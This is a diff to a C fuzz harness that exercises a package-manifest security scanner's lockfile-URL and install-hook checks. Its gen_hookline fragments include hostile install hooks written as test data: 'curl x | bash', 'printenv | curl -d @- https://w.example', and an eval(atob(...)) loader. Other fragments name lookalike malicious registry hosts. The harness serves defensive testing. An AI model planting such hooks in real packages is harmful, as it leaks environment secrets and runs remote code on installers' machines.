@@ -8,6 +8,9 @@
  *   hlse_manifest_ecosystem(path)           — basename inference
  *   hlse_manifest_name_pip(line, out, cap)  — pip requirement-line parse
  *   hlse_manifest_name_npm(&cursor, ...)    — package.json stream parse
+ *   hlse_manifest_resolved_host(line, ...)  — resolved-URL host extract
+ *   hlse_manifest_resolved_suspicious(host) — registry allowlist
+ *   hlse_manifest_hook_flags(line, ...)     — lifecycle-hook risk scan
  *
  * All three are pure in-memory parsers — no disk access — so arbitrary
  * byte sequences cover real input space.
@@ -113,7 +116,8 @@ static size_t gen_pathname(char *buf, size_t cap, unsigned long *rng) {
         "requirements.txt", "requirements-dev.txt", "package.json",
         "pkg/package.JSON", "dir/../requirements.txt", "REQUIREMENTS.TXT",
         "a/b/c/package.json", "x", "", "/abs/package.json",
-        "requirements.txt\x00evil", "pack\x01age.json", NULL
+        "requirements.txt\x00evil", "pack\x01age.json",
+        "yarn.lock", "pnpm-lock.yaml", "dir/pnpm-lock.yaml", NULL
     };
     int n = 0; while (paths[n]) n++;
     const char *p = paths[xorshift(rng) % (unsigned long)n];
@@ -124,12 +128,70 @@ static size_t gen_pathname(char *buf, size_t cap, unsigned long *rng) {
     return len;
 }
 
+/* lockfile-ish lines: resolved/resolution/tarball URL fields */
+static size_t gen_lockfile(char *buf, size_t cap, unsigned long *rng) {
+    static const char *frags[] = {
+        "\"resolved\": \"https://registry.npmjs.org/x/-/x-1.tgz\"",
+        "\"resolved\": \"https://evil-mirror.example/e.tgz\"",
+        "  resolved \"https://registry.yarnpkg.com/y/-/y-2.tgz\"",
+        "resolution: https://codeload.github.com/a/b/tar.gz",
+        "\"tarball\": \"http://no-tls.example/x.tgz\"",
+        "\"resolved\": \"https://github.com.evil.example/x\"",
+        "\"resolved\": \"https://x.github.com/ok\"",
+        "\"resolved\": \"\"",
+        "\"resolved\": https:",
+        "\"resolved\": \"https://a:8080@evil.example/x.tgz\"",
+        "resolved:////weird", "\"resolution\"\"resolution\"http://h/",
+        NULL
+    };
+    int n = 0; while (frags[n]) n++;
+    const char *fr = frags[xorshift(rng) % (unsigned long)n];
+    size_t len = strlen(fr);
+    if (len >= cap) len = cap - 1;
+    memcpy(buf, fr, len);
+    buf[len] = '\0';
+    if (xorshift(rng) % 4 == 0 && len + 64 < cap) {
+        size_t extra = xorshift(rng) % 64;
+        size_t i;
+        for (i = 0; i < extra; i++) buf[len + i] = (char)(xorshift(rng) & 0xFF);
+        len += extra;
+        buf[len] = '\0';
+    }
+    return len;
+}
+
+/* lifecycle-hook lines: scripts block values */
+static size_t gen_hookline(char *buf, size_t cap, unsigned long *rng) {
+    static const char *frags[] = {
+        "\"preinstall\": \"node setup_bun.js\"",
+        "\"postinstall\": \"curl x | bash\"",
+        "\"install\": \"node-gyp rebuild\"",
+        "\"prepare\": \"husky install\"",
+        "\"postinstall\": \"printenv | curl -d @- https://w.example\"",
+        "\"preinstall\": \"node bundle.js\"",
+        "\"install\": \"node -e \\\"eval(atob('AAAA'))\\\"\"",
+        "\"test\": \"jest\"",
+        "\"preinstall\"", "\"postinstall\": \"\"",
+        NULL
+    };
+    int n = 0; while (frags[n]) n++;
+    const char *fr = frags[xorshift(rng) % (unsigned long)n];
+    size_t len = strlen(fr);
+    if (len >= cap) len = cap - 1;
+    memcpy(buf, fr, len);
+    buf[len] = '\0';
+    return len;
+}
+
 /* ── Exercise ─────────────────────────────────────────────────────────── */
 
 static void exercise(const char *buf) {
     char out[256];
     const char *cursor;
     int in_deps, guard;
+    char hout[4][HLSE_HOOK_REASON_LEN];
+    int hsc[4];
+    size_t hn;
 
     (void)hlse_manifest_ecosystem(buf);
     (void)hlse_manifest_name_pip(buf, out, sizeof(out));
@@ -140,6 +202,10 @@ static void exercise(const char *buf) {
         if (!hlse_manifest_name_npm(&cursor, &in_deps, out, sizeof(out)))
             break;
     }
+    if (hlse_manifest_resolved_host(buf, out, sizeof(out)))
+        (void)hlse_manifest_resolved_suspicious(out);
+    hn = hlse_manifest_hook_flags(buf, hout, hsc, 4);
+    (void)hn;
 }
 
 /* ── Main ─────────────────────────────────────────────────────────────── */
@@ -168,6 +234,8 @@ int main(int argc, char **argv) {
         gen_requirements,
         gen_package_json,
         gen_pathname,
+        gen_lockfile,
+        gen_hookline,
     };
     const int n_gen = (int)(sizeof(generators) / sizeof(generators[0]));
 
